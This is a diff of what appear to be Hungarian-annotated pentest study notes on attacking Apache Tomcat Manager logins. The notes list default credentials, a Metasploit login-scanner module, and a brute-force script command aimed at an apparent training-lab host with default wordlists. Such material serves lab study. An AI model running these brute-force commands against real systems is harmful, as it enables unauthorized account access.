@@ -21,7 +21,7 @@ admin:admin
 ### metasploit
 msf> auxiliary/scanner/http/tomcat_mgr_login  
 ### python script
-!!!! itt van kulon tomcat-users meg tocmat-passwords directory!!! Erdemes azt hasznalni!!!
+**!!!! itt van kulon tomcat-users meg tocmat-passwords directory!!! Erdemes azt hasznalni!!!**  
 https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce  
 python3 mgr_brute.py -U http://web01.inlanefreight.local:8180/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt  
 ### tomcat wordlists
